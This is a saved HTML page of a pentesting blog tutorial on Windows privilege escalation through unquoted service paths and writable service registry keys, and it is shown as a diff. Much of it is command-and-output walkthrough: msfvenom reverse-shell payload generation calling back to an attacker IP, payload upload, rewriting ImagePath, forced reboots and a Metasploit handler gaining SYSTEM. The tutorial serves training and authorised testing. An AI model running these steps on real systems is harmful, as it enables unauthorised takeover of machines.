@@ -1,0 +1,1322 @@
+<!doctype html>
+<!--[if !IE]>
+<html class="no-js non-ie" lang="en-US"> <![endif]-->
+<!--[if IE 7 ]>
+<html class="no-js ie7" lang="en-US"> <![endif]-->
+<!--[if IE 8 ]>
+<html class="no-js ie8" lang="en-US"> <![endif]-->
+<!--[if IE 9 ]>
+<html class="no-js ie9" lang="en-US"> <![endif]-->
+<!--[if gt IE 9]><!-->
+<html class="no-js" lang="en-US"> <!--<![endif]-->
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="theme-color" content="">
+<script src="/cdn-cgi/apps/head/0I43Bxg6NSCFiP6ZrmEK6USGESM.js"></script><link rel="profile" href="http://gmpg.org/xfn/11">
+<title>Windows Privilege Escalation Methods for Pentesters &#8211; Pentest Blog</title>
+<link rel='dns-prefetch' href='//fonts.googleapis.com' />
+<link rel='dns-prefetch' href='//s.w.org' />
+<link rel="alternate" type="application/rss+xml" title="Pentest Blog &raquo; Feed" href="https://pentest.blog/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Pentest Blog &raquo; Comments Feed" href="https://pentest.blog/comments/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Pentest Blog &raquo; Windows Privilege Escalation Methods for Pentesters Comments Feed" href="https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/feed/" />
+<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.4\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.4\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/pentest.blog\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.9.6"}};
+			!function(a,b,c){function d(a,b){var c=String.fromCharCode;l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,a),0,0);var d=k.toDataURL();l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,b),0,0);var e=k.toDataURL();return d===e}function e(a){var b;if(!l||!l.fillText)return!1;switch(l.textBaseline="top",l.font="600 32px Arial",a){case"flag":return!(b=d([55356,56826,55356,56819],[55356,56826,8203,55356,56819]))&&(b=d([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]),!b);case"emoji":return b=d([55357,56692,8205,9792,65039],[55357,56692,8203,9792,65039]),!b}return!1}function f(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var g,h,i,j,k=b.createElement("canvas"),l=k.getContext&&k.getContext("2d");for(j=Array("flag","emoji"),c.supports={everything:!0,everythingExceptFlag:!0},i=0;i<j.length;i++)c.supports[j[i]]=e(j[i]),c.supports.everything=c.supports.everything&&c.supports[j[i]],"flag"!==j[i]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[j[i]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(h=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",h,!1),a.addEventListener("load",h,!1)):(a.attachEvent("onload",h),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),g=c.source||{},g.concatemoji?f(g.concatemoji):g.wpemoji&&g.twemoji&&(f(g.twemoji),f(g.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+
+<style>
+
+        .sc_team_single_member .sc_single_side .social span {
+            background: ;
+        }
+
+    </style>
+
+<style>
+
+        .grid#sc_our_team .sc_team_member .sc_team_member_name,
+        .grid#sc_our_team .sc_team_member .sc_team_member_jobtitle {
+            background: ;
+        }
+
+        .grid#sc_our_team .sc_team_member {
+            padding: 0px !important;
+        }
+
+    </style>
+
+<style>
+
+        .grid_circles#sc_our_team .sc_team_member .sc_team_member_jobtitle,
+        .grid_circles#sc_our_team .sc_team_member .sc_team_member_name {
+            background: ;
+        }
+
+        .grid_circles#sc_our_team .sc_team_member {
+            margin: 0px;
+        }
+
+    </style>
+
+<style>
+
+        .grid_circles2#sc_our_team .sc_team_member {
+            margin: 0px;
+        }
+
+    </style>
+<link rel='stylesheet' id='ots-common-css' href='https://pentest.blog/wp-content/plugins/our-team-enhanced/assets/css/common.css?ver=4.4.0' type='text/css' media='all' />
+<link rel='stylesheet' id='ots-widget-css' href='https://pentest.blog/wp-content/plugins/our-team-enhanced/assets/css/widgets.css?ver=4.4.0' type='text/css' media='all' />
+<link rel='stylesheet' id='sparkling-bootstrap-css' href='https://pentest.blog/wp-content/themes/sparkling/assets/css/bootstrap.min.css?ver=4.9.6' type='text/css' media='all' />
+<link rel='stylesheet' id='sparkling-icons-css' href='https://pentest.blog/wp-content/themes/sparkling/assets/css/font-awesome.min.css?ver=4.9.6' type='text/css' media='all' />
+<link rel='stylesheet' id='sparkling-fonts-css' href='//fonts.googleapis.com/css?family=Open+Sans%3A400italic%2C400%2C600%2C700%7CRoboto+Slab%3A400%2C300%2C700&#038;ver=4.9.6' type='text/css' media='all' />
+<link rel='stylesheet' id='sparkling-style-css' href='https://pentest.blog/wp-content/themes/sparkling/style.css?ver=4.9.6' type='text/css' media='all' />
+<link rel='stylesheet' id='enlighter-local-css' href='https://pentest.blog/wp-content/plugins/enlighter/resources/EnlighterJS.min.css?ver=3.5' type='text/css' media='all' />
+<script type='text/javascript' src='https://pentest.blog/wp-includes/js/jquery/jquery.js?ver=1.12.4'></script>
+<script type='text/javascript' src='https://pentest.blog/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
+<script type='text/javascript' src='https://pentest.blog/wp-content/themes/sparkling/assets/js/vendor/modernizr.min.js?ver=4.9.6'></script>
+<script type='text/javascript' src='https://pentest.blog/wp-content/themes/sparkling/assets/js/vendor/bootstrap.min.js?ver=4.9.6'></script>
+<script type='text/javascript' src='https://pentest.blog/wp-content/themes/sparkling/assets/js/functions.min.js?ver=4.9.6'></script>
+<link rel='https://api.w.org/' href='https://pentest.blog/wp-json/' />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://pentest.blog/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://pentest.blog/wp-includes/wlwmanifest.xml" />
+<link rel='prev' title='Art of Anti Detection 2 &#8211; PE Backdoor Manufacturing' href='https://pentest.blog/art-of-anti-detection-2-pe-backdoor-manufacturing/' />
+<link rel='next' title='Unexpected Journey into the AlienVault OSSIM/USM During Engagement' href='https://pentest.blog/unexpected-journey-into-the-alienvault-ossimusm-during-engagement/' />
+<meta name="generator" content="WordPress 4.9.6" />
+<link rel="canonical" href="https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/" />
+<link rel='shortlink' href='https://pentest.blog/?p=454' />
+<link rel="alternate" type="application/json+oembed" href="https://pentest.blog/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fpentest.blog%2Fwindows-privilege-escalation-methods-for-pentesters%2F" />
+<meta name="twitter:card" value="summary_large_image" />
+<meta name="twitter:site" value="@pentestblog" />
+<meta name="twitter:creator" value="@pentestblog" />
+<meta name="twitter:title" value="Windows Privilege Escalation Methods for Pentesters" />
+<meta name="twitter:description" value="Imagine that you have gotten a low-priv Meterpreter session on a Windows machine. Probably you&#8217;ll run getsystem to escalate your privileges. But what if it fails? Don&#8217;t panic. There are still some techniques you can try. Unquoted Service Paths Basically, it is a vulnerability that occurs if a service executable path is not enclosed with quotation [...]" />
+<meta name="twitter:image" value="https://pentest.blog/wp-content/uploads/taking-down-windows-nazi.jpg" />
+<meta property="og:title" content="Windows Privilege Escalation Methods for Pentesters" />
+<meta property="og:type" content="article" />
+<meta property="og:image" content="https://pentest.blog/wp-content/uploads/taking-down-windows-nazi.jpg" />
+<meta property="og:url" content="https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/" />
+<meta property="og:description" content="Imagine that you have gotten a low-priv Meterpreter session on a Windows machine. Probably you&#8217;ll run getsystem to escalate your privileges. But what if it fails? Don&#8217;t panic. There are still some techniques you can try. Unquoted Service Paths Basically, it is a vulnerability that occurs if a service executable path is not enclosed with quotation [...]" />
+<meta property="og:site_name" content="Pentest Blog" />
+<style type="text/css">.entry-content {font-family: Tahoma, Geneva;}.entry-content {font-size:15px}</style> <style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
+<link rel="icon" href="https://pentest.blog/wp-content/uploads/logo-favicon.png" sizes="32x32" />
+<link rel="icon" href="https://pentest.blog/wp-content/uploads/logo-favicon.png" sizes="192x192" />
+<link rel="apple-touch-icon-precomposed" href="https://pentest.blog/wp-content/uploads/logo-favicon.png" />
+<meta name="msapplication-TileImage" content="https://pentest.blog/wp-content/uploads/logo-favicon.png" />
+<style type="text/css" id="wp-custom-css">
+			#secondary .widget a {
+    color: #636467;
+}		</style>
+</head>
+<body class="post-template-default single single-post postid-454 single-format-standard group-blog">
+<a class="sr-only sr-only-focusable" href="#content">Skip to main content</a>
+<div id="page" class="hfeed site">
+<header id="masthead" class="site-header" role="banner">
+<nav class="navbar navbar-default " role="navigation">
+<div class="container">
+<div class="row">
+<div class="site-navigation-inner col-sm-12">
+<div class="navbar-header">
+<button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+<span class="sr-only">Toggle navigation</span>
+<span class="icon-bar"></span>
+<span class="icon-bar"></span>
+<span class="icon-bar"></span>
+</button>
+<div id="logo">
+<a href="https://pentest.blog/"><img src="https://pentest.blog/wp-content/uploads/pentestblog-color-e1508706802866.png" height="67" width="280" alt="Pentest Blog" /></a>
+</div>
+</div>
+<div class="collapse navbar-collapse navbar-ex1-collapse"><ul id="menu-header-menu" class="nav navbar-nav"><li id="menu-item-1061" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1061"><a href="https://pentest.blog/category/advisories/">Advisories</a></li>
+<li id="menu-item-105" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-105"><a href="https://pentest.blog/category/operating-system/">Operating System</a></li>
+<li id="menu-item-20" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-20"><a href="https://pentest.blog/category/application-security/">Application Security</a></li>
+<li id="menu-item-11" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-11"><a href="https://pentest.blog/category/network/">Network</a></li>
+<li id="menu-item-106" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-106"><a href="https://pentest.blog/category/tools/">Tools</a></li>
+<li id="menu-item-991" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-991"><a href="https://pentest.blog/article-series/">Article Series</a></li>
+<li id="menu-item-14" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-14"><a href="https://pentest.blog/about-us/">About Us</a></li>
+</ul></div> </div>
+</div>
+</div>
+</nav>
+</header>
+<div id="content" class="site-content">
+<div class="top-section">
+</div>
+<div class="container main-content-area">
+<div class="row side-pull-left">
+<div class="main-content-inner col-sm-12 col-md-8">
+<div id="primary" class="content-area">
+<main id="main" class="site-main" role="main">
+<article id="post-454" class="post-454 post type-post status-publish format-standard has-post-thumbnail hentry category-operating-system tag-privilege-escalation tag-windows">
+<img width="750" height="410" src="https://pentest.blog/wp-content/uploads/taking-down-windows-nazi-750x410.jpg" class="single-featured wp-post-image" alt="" /> <div class="post-inner-content">
+<header class="entry-header page-header">
+<h1 class="entry-title ">Windows Privilege Escalation Methods for Pentesters</h1>
+<div class="entry-meta">
+<span class="posted-on"><i class="fa fa-calendar"></i> <a href="https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/" rel="bookmark"><time class="entry-date published" datetime="2017-01-18T21:13:41+00:00">January 18, 2017</time><time class="updated" datetime="2017-01-30T17:59:12+00:00">January 30, 2017</time></a></span><span class="byline"> <i class="fa fa-user"></i> <span class="author vcard"><a class="url fn n" href="https://pentest.blog/author/gokhan-sagoglu/">Gokhan Sagoglu</a></span></span>
+<span class="cat-links"><i class="fa fa-folder-open-o"></i>
+<a href="https://pentest.blog/category/operating-system/" rel="category tag">Operating System</a> </span>
+</div>
+</header>
+<div class="entry-content">
+<p>Imagine that you have gotten a low-priv Meterpreter session on a Windows machine. Probably you&#8217;ll run <em>getsystem</em> to escalate your privileges. But what if it fails?</p>
+<p>Don&#8217;t panic. There are still some techniques you can try.</p>
+<p><span id="more-454"></span></p>
+<h3>Unquoted Service Paths</h3>
+<p>Basically, it is a vulnerability that occurs if a service executable path is not enclosed with quotation marks and contains space.</p>
+<p>To identify these unquoted services you can run this command on Windows Command Shell:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="null">wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """</pre>
+<p>All services with unquoted executable paths will be listed:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="null" data-enlighter-highlight="7,9">meterpreter &gt; shell
+Process 4024 created.
+Channel 1 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Users\testuser\Desktop&gt;wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
+wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
+Vulnerable Service                                      Vulnerable Service                   C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe                   Auto       
+
+C:\Users\testuser\Desktop&gt;</pre>
+<p>If you look at the registry entry for this service with Regedit you can see the <strong>ImagePath</strong> value is:<br />
+<strong>C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe<br />
+</strong></p>
+<p>It should be like this:<br />
+<strong>&#8220;C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe&#8221;</strong></p>
+<p><img class="alignnone wp-image-486" src="https://pentest.blog/wp-content/uploads/unquoted_regedit-300x105.png" alt="" width="843" height="295" srcset="https://pentest.blog/wp-content/uploads/unquoted_regedit-300x105.png 300w, https://pentest.blog/wp-content/uploads/unquoted_regedit-768x269.png 768w, https://pentest.blog/wp-content/uploads/unquoted_regedit.png 843w" sizes="(max-width: 843px) 100vw, 843px" /></p>
+<p>When Windows attempts to run this service, it will look at the following paths in order and will run the first EXE that it will find:</p>
+<blockquote><p>C:\Program.exe<br />
+C:\Program Files.exe<br />
+C:\Program Files (x86)\Program.exe<br />
+C:\Program Files (x86)\Program Folder\A.exe<br />
+C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe</p></blockquote>
+<p>This vulnerability is caused by the <em>CreateProcess</em> function in Windows operating systems. For more information click read <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms682425(v=vs.85).aspx">this article</a>.</p>
+<p>If we can drop our malicious exe successfully on one of these paths, upon a restart of the service, Windows will run our exe as SYSTEM. But we should have necessary privileges on one of these folders.</p>
+<p>In order to check the permissions of a folder, we can use built-in Windows tool, icals. Let&#8217;s check permissions for <em>C:\Program Files (x86)\Program Folder</em> folder:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="null">meterpreter &gt; shell
+Process 1884 created.
+Channel 4 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Program Files (x86)\Program Folder&gt;icacls "C:\Program Files (x86)\Program Folder"
+icacls "C:\Program Files (x86)\Program Folder"
+C:\Program Files (x86)\Program Folder Everyone:(OI)(CI)(F)
+                                      NT SERVICE\TrustedInstaller:(I)(F)
+                                      NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
+                                      NT AUTHORITY\SYSTEM:(I)(F)
+                                      NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
+                                      BUILTIN\Administrators:(I)(F)
+                                      BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
+                                      BUILTIN\Users:(I)(RX)
+                                      BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
+                                      CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+                                      APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
+                                      APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
+
+Successfully processed 1 files; Failed processing 0 files
+
+C:\Program Files (x86)\Program Folder&gt;
+</pre>
+<p>What a luck! As you can see, &#8220;Everyone&#8221; has full control on this folder.</p>
+<p>F = Full Control<br />
+CI = Container Inherit &#8211; This flag indicates that subordinate containers will inherit this ACE.<br />
+OI = Object Inherit &#8211; This flag indicates that subordinate files will inherit the ACE.</p>
+<p>This means we are free to put any file to this folder!</p>
+<p>From now on, what you&#8217;re going to do depends on your imagination. I simply preferred to generate a reverse shell payload to run as SYSTEM.</p>
+<p>MSFvenom can be used for this job:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="null" data-enlighter-highlight="1"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="1664797962567d777a7f">[email&#160;protected]</a>:~# msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=192.168.2.60 LPORT=8989 -f exe -o A.exe
+No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No Arch selected, selecting Arch: x86 from the payload
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 360 (iteration=0)
+x86/shikata_ga_nai chosen with final size 360
+Payload size: 360 bytes
+Final size of exe file: 73802 bytes
+Saved as: A.exe</pre>
+<p>Let&#8217;s place our payload to <em>C:\Program Files (x86)\Program Folder</em> folder:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="null" data-enlighter-highlight="12">meterpreter &gt; getuid
+Server username: TARGETMACHINE\testuser
+meterpreter &gt; cd "../../../Program Files (x86)/Program Folder"
+meterpreter &gt; ls
+Listing: C:\Program Files (x86)\Program Folder
+==============================================
+
+Mode             Size  Type  Last modified              Name
+----             ----  ----  -------------              ----
+40777/rwxrwxrwx  0     dir   2017-01-04 21:43:28 -0500  A Subfolder
+
+meterpreter &gt; upload -f A.exe
+[*] uploading  : A.exe -&gt; A.exe
+[*] uploaded   : A.exe -&gt; A.exe
+meterpreter &gt; ls
+Listing: C:\Program Files (x86)\Program Folder
+==============================================
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+40777/rwxrwxrwx   0      dir   2017-01-04 21:43:28 -0500  A Subfolder
+100777/rwxrwxrwx  73802  fil   2017-01-04 22:01:32 -0500  A.exe
+
+meterpreter &gt; 
+</pre>
+<p>At the next start of the service, <em>A.exe</em> will run as SYSTEM. Let&#8217;s try to stop and restart the service:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="null" data-enlighter-highlight="7">meterpreter &gt; shell
+Process 1608 created.
+Channel 2 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Users\testuser\Desktop&gt;sc stop "Vulnerable Service"
+sc stop "Vulnerable Service"
+[SC] OpenService FAILED 5:
+
+Access is denied.
+
+
+C:\Users\testuser\Desktop&gt;
+</pre>
+<p>Access is denied because we don&#8217;t have permission to stop or start the service. However, it&#8217;s not a big deal, we can wait for someone to restart the machine, or we can do it ourselves with <em>shutdown</em> command:</p>
+<pre class="EnlighterJSRAW" data-enlighter-highlight="1">C:\Users\testuser\Desktop&gt;shutdown /r /t 0
+shutdown /r /t 0
+
+C:\Users\testuser\Desktop&gt;
+[*] 192.168.2.40 - Meterpreter session 8 closed. Reason: Died</pre>
+<p>As you can see, our session has died. We&#8217;ll never forget you low-priv shell. RIP.</p>
+<p>Our target machine is restarting now. Soon, our payload will work as SYSTEM. We should start a handler right away.</p>
+<pre class="EnlighterJSRAW" data-enlighter-highlight="8-11">msf &gt; use exploit/multi/handler 
+msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp
+payload =&gt; windows/meterpreter/reverse_tcp
+msf exploit(handler) &gt; set lhost 192.168.2.60 
+lhost =&gt; 192.168.2.60
+msf exploit(handler) &gt; set lport 8989
+lport =&gt; 8989
+msf exploit(handler) &gt; run
+
+[*] Started reverse TCP handler on 192.168.2.60:8989 
+[*] Starting the payload handler...
+[*] Sending stage (957999 bytes) to 192.168.2.40
+[*] Meterpreter session 1 opened (192.168.2.60:8989 -&gt; 192.168.2.40:49156) at 2017-01-04 22:37:17 -0500
+
+meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter &gt; 
+[*] 192.168.2.40 - Meterpreter session 1 closed.  Reason: Died
+
+</pre>
+<p>Now we have gotten a Meterpreter shell with SYSTEM privileges. High five!</p>
+<p>But wait, why did our session die so quickly? We just started!</p>
+<p>No need to worry. It&#8217;s because, when a service starts in Windows operating systems, it must communicate with the Service Control Manager. If it&#8217;s not, Service Control Manager thinks that something is not going well and terminates the process.</p>
+<p>All we need to do is migrating to another process before the SCM terminates our payload, or you can consider using auto-migration. 😉</p>
+<p>BTW there is a Metasploit module for checking and exploiting this vulnerability: <a href="https://www.rapid7.com/db/modules/exploit/windows/local/trusted_service_path"><em>exploit/windows/local/trusted_service_path</em></a></p>
+<p>This module only requires that you link it to an existing Meterpreter session before running:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="null" data-enlighter-highlight="1,8">msf &gt; use exploit/windows/local/trusted_service_path
+msf exploit(trusted_service_path) &gt; show options
+
+Module options (exploit/windows/local/trusted_service_path):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on.
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows
+</pre>
+<p>However, it&#8217;s always good to know the internals. 😉</p>
+<p>If you want to demonstrate this vulnerability yourself, you can add a vulnerable service to your test environment:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="null" data-enlighter-highlight="7,9">C:\Windows\System32&gt;sc create "Vulnerable Service" binPath= "C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe" start=auto
+C:\Windows\System32&gt;cd C:\Program Files (x86)
+C:\Program Files (x86)&gt;mkdir "Program Folder\A Subfolder"
+C:\Program Files (x86)&gt;icacls "C:\Program Files (x86)\Program Folder" /grant Everyone:(OI)(CI)F /T
+
+</pre>
+<h3>Services with Vulnerable Privileges</h3>
+<p>You know, Windows services run as SYSTEM. So, their folders, files, and registry keys must be protected with strong access controls. In some cases, we encounter services that are not sufficiently protected.</p>
+<h4>Insecure Registry Permissions</h4>
+<p>In Windows, information related to services is stored in <em>HKLM\SYSTEM\CurrentControlSet\Services </em>registry key. If we want to see information about our &#8220;Vulnerable Service&#8221; we should check <em>HKLM\SYSTEM\ControlSet001\Services\Vulnerable Service</em> key.</p>
+<p><img class="alignnone wp-image-701" src="https://pentest.blog/wp-content/uploads/vulnerable-privileges-300x116.png" alt="" width="856" height="331" srcset="https://pentest.blog/wp-content/uploads/vulnerable-privileges-300x116.png 300w, https://pentest.blog/wp-content/uploads/vulnerable-privileges-768x296.png 768w, https://pentest.blog/wp-content/uploads/vulnerable-privileges.png 856w" sizes="(max-width: 856px) 100vw, 856px" /></p>
+<p>Of course, our Vulnerable Service has some weaknesses. 🙂</p>
+<p><img class="alignnone size-medium wp-image-702" src="https://pentest.blog/wp-content/uploads/vulnerable-privileges-2-247x300.png" alt="" width="247" height="300" srcset="https://pentest.blog/wp-content/uploads/vulnerable-privileges-2-247x300.png 247w, https://pentest.blog/wp-content/uploads/vulnerable-privileges-2.png 377w" sizes="(max-width: 247px) 100vw, 247px" /></p>
+<p>But the point is, how can we check these permissions from the command line? Let&#8217;s start the scenario from the beginning.</p>
+<p>You have gotten a low-priv Meterpreter session and you want to check permissions of a service.</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="null">meterpreter &gt; getuid
+Server username: TARGETMACHINE\testuser</pre>
+<p>You can use <a href="https://www.microsoft.com/en-us/download/details.aspx?id=23510">SubInACL</a> tool to check registry keys permissions. You can download it <a href="https://www.microsoft.com/en-us/download/details.aspx?id=23510">here</a> but the point you need to be aware of it deployed as an msi file. If AlwaysInstallElevated policy setting is not enabled on target machine you can&#8217;t install msi files with low-priv user.(We will discuss AlwaysInstallElevated policy later in this post) And of course, you may do not want to install a new software to the target machine.</p>
+<p>I recommend you to install it a virtual machine and find <em>subinacl.exe</em> file in <em>C:\Program Files (x86)\Windows Resource Kits\Tools\.</em> It will work smoothly without having to install msi package.</p>
+<p>Let&#8217;s upload SubInACL<i> </i>tool to our target:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="null" data-enlighter-highlight="4">meterpreter &gt; cd %temp%
+meterpreter &gt; pwd
+C:\Users\testuser\AppData\Local\Temp
+meterpreter &gt; upload -f subinacl.exe
+[*] uploading  : subinacl.exe -&gt; subinacl.exe
+[*] uploaded   : subinacl.exe -&gt; subinacl.exe
+meterpreter &gt;</pre>
+<p>Now SubInACL tool ready to use. Let&#8217;s check permissions for <em>HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service.</em></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="null" data-enlighter-highlight="7,20-23">meterpreter &gt; shell
+Process 2196 created.
+Channel 3 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Users\testuser\AppData\Local\Temp&gt;subinacl.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service" /display
+subinacl.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service" /display
+SeSecurityPrivilege : Access is denied.
+
+WARNING :Unable to set SeSecurityPrivilege privilege. This privilege may be required. 
+
+================================================================================
++KeyReg HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service
+================================================================================
+/control=0x400 SE_DACL_AUTO_INHERITED-0x0400 
+/owner             =builtin\administrators
+/primary group     =system
+/perm. ace count   =10
+/pace =everyone 	ACCESS_ALLOWED_ACE_TYPE-0x0
+  CONTAINER_INHERIT_ACE-0x2      
+    Key and SubKey - Type of Access:
+  Full Control
+    Detailed Access Flags :
+  KEY_QUERY_VALUE-0x1        KEY_SET_VALUE-0x2          KEY_CREATE_SUB_KEY-0x4     
+  KEY_ENUMERATE_SUB_KEYS-0x8 KEY_NOTIFY-0x10            KEY_CREATE_LINK-0x20       DELETE-0x10000             
+  READ_CONTROL-0x20000       WRITE_DAC-0x40000          WRITE_OWNER-0x80000        
+.
+.
+.
+.
+.
+.
+
+
+C:\Users\testuser\AppData\Local\Temp&gt;</pre>
+<p>Focus on 20th to 23rd lines. It says <em>Everyone</em> has <em>Full Control</em> on this registry key. It means we can change the executable path of this service by editing the <em>ImagePath</em> value. It&#8217;s a huge security weakness.</p>
+<p>If we generate a simple reverse shell payload and drop it to our target, all that remains is changing the <em>ImagePath</em> value for our vulnerable service with our payload&#8217;s path.</p>
+<p>Let&#8217;s generate a simple reverse shell payload:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="null" data-enlighter-highlight="1"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="1f6d70706b5f747e7376">[email&#160;protected]</a>:~# msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=192.168.2.60 LPORT=8989 -f exe -o Payload.exe
+No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No Arch selected, selecting Arch: x86 from the payload
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 360 (iteration=0)
+x86/shikata_ga_nai chosen with final size 360
+Payload size: 360 bytes
+Final size of exe file: 73802 bytes
+Saved as: Payload.exe</pre>
+<p>Drop it to target machine:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="null" data-enlighter-highlight="1,3">meterpreter &gt; pwd
+C:\Users\testuser\AppData\Local\Temp
+meterpreter &gt; upload -f Payload.exe
+[*] uploading  : Payload.exe -&gt; Payload.exe
+[*] uploaded   : Payload.exe -&gt; Payload.exe
+meterpreter &gt;</pre>
+<p>Now let&#8217;s change the <em>ImagePath</em> value with our payload&#8217;s path.</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="null" data-enlighter-highlight="7">meterpreter &gt; shell
+Process 280 created.
+Channel 1 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Users\testuser\AppData\Local\Temp&gt;reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\testuser\AppData\Local\Temp\Payload.exe" /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\testuser\AppData\Local\Temp\Payload.exe" /f
+The operation completed successfully.
+
+C:\Users\testuser\AppData\Local\Temp&gt;
+</pre>
+<p>At the next start of the service, <em>Payload.exe </em>will run as SYSTEM. But remember, we had to restart the computer to do this.</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="null" data-enlighter-highlight="1">C:\Users\testuser\AppData\Local\Temp&gt;shutdown /r /t 0
+shutdown /r /t 0
+
+C:\Users\testuser\AppData\Local\Temp&gt;
